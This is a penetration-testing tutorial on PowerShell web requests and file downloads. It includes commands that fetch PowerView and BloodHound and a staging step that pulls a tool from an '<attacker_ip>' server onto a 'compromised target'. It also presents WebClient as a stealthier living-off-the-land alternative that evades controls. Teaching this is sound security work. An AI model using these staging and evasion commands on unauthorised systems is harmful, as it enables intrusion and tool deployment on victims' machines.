# Interacting With The Web


## 1. `Invoke-WebRequest` - The PowerShell Web Client

**`Invoke-WebRequest`** is the primary, built-in PowerShell cmdlet for sending HTTP/S requests to a web page or web service. It is a powerful and flexible tool that can handle a wide variety of web-related tasks.

*   **Common Aliases:** `iwr`, `curl`, `wget`
*   **Key Functionality:**
    *   Makes GET, POST, and other HTTP requests.
    *   Downloads files.
    *   Parses HTML responses into structured objects.
    *   Manages web sessions and authentication.

### Making a Basic Web Request
The core function is to retrieve content from a URL. By default, PowerShell parses the HTML response into a rich object.

```powershell
# Make a GET request to the specified URL
Invoke-WebRequest -Uri "https://example.com" -Method GET
```

### Working with the Response Object
The real power of `Invoke-WebRequest` is that its output is an object with many useful properties that can be filtered and explored.

*   **Viewing All Properties and Methods:**
    ```powershell
    Invoke-WebRequest -Uri "https://example.com" | Get-Member
    ```
*   **Common Properties to Inspect:**
    *   `.StatusCode`: The HTTP status code of the response (e.g., `200`).
    *   `.Headers`: A dictionary of all the response headers.
    *   `.Content`: The raw text content of the response body (e.g., the HTML source).
    *   `.Images`, `.Links`, `.Forms`: Parsed collections of all the images, links, or forms found on the page.

*   **Example: Filtering for all images on a page:**
    ```powershell
    # The 'fl' is an alias for 'Format-List'
    Invoke-WebRequest -Uri "https://example.com" | Select-Object -ExpandProperty Images | fl
    ```

---

## 2. Downloading Files

`Invoke-WebRequest` is the standard PowerShell method for downloading files from the command line.

*   **Syntax:**
    ```powershell
    Invoke-WebRequest -Uri <URL_of_file> -OutFile <local_path_to_save>
    ```
*   **Example: Downloading PowerView from GitHub:**
    ```powershell
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\Tools\PowerView.ps1"
    ```

### Practical Use Case for Pentesters
A common technique is to host tools on a simple web server on your attacker machine and then use `Invoke-WebRequest` on the compromised target machine to download them. This avoids generating traffic to the public internet from the target, which is often a stealthier approach.

1.  **On Attacker Machine (Linux):** Start a simple Python web server in the directory containing your tools.
    ```shell
    python3 -m http.server 8000
    ```
2.  **On Target Machine (Windows):** Use `Invoke-WebRequest` to download the tool from your attacker machine.
    ```powershell
    Invoke-WebRequest -Uri "http://<attacker_ip>:8000/MyTool.exe" -OutFile "C:\Temp\MyTool.exe"
    ```

---

## 3. Alternative Download Method: `.Net.WebClient`

If `Invoke-WebRequest` is restricted or monitored, another built-in method for downloading files is to directly use the .NET Framework's `WebClient` class. This is a very common "living off the land" technique.

*   **Syntax:**
    ```powershell
    (New-Object Net.WebClient).DownloadFile("<URL_of_file>", "<local_path_to_save>")
    ```
*   **Example: Downloading BloodHound:**
    ```powershell
    (New-Object Net.WebClient).DownloadFile("https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip", "Bloodhound.zip")
    ```
This method is often less likely to be blocked by basic application control policies than `Invoke-WebRequest` and is a valuable alternative for penetration testers.
